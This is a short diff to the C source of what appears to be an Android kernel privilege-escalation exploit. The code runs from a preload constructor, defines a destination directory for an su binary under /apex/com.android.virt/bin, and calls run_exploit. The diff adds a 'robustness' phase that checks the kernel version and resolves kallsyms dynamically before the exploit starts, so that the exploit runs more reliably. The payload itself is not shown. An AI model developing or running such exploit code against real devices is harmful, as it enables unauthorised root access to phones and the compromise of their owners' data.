@@ -1,4 +1,5 @@
 #include "common.h"
+#include "robustness.h"
 #include <sys/mount.h>
 
 #define SU_DST_DIR "/apex/com.android.virt/bin"
@@ -400,5 +401,15 @@ __attribute__((constructor)) static void load(void) {
   };
 
   pr_success("preload starting pid=%d\n", getpid());
+
+  /* 鲁棒性检查 Phase 1: 版本校验 + kallsyms 动态查找 */
+  static robustness_result_t rr;
+  if (robustness_check_phase1(&rr) != 0) {
+    pr_warning("robustness phase1 failed, aborting exploit\n");
+    return;
+  }
+  pr_info("robustness phase1 done: version_match=%d kallsyms=%d\n",
+          rr.version_match, rr.kallsyms_resolved);
+
   run_exploit(1, argv);
 }
